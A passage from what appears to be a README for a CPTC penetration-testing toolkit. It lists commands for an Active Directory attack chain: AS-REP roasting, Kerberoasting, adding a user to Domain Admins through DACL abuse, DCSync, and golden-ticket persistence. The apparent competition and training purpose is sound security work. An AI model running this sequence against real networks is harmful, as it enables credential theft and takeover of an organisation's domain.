./02_enum_nocreds.sh -d CORP
# 3. first credential
./asreproast.sh -d CORP -U runs/02.../kerbrute.out --crack
# 4. authenticated enum — composite
./03_enum_creds.sh
# 5. better credential
./kerberoast.sh --crack
# 6. escalate (example: ACL edge from BloodHound)
./dacl_abuse.sh -T AddMember -g 'Domain Admins' -a jdoe
# 7. loot the DC
./dcsync.sh -m full
# 8. domain persistence PoC
./goldenticket.sh -d CORP
# 9. verify redaction any time
bash lib/common.sh --selftest
```

Everything above lands, redacted, in `~/cptc-logs/master.log`, with full per-command output
under `~/cptc-logs/runs/`.
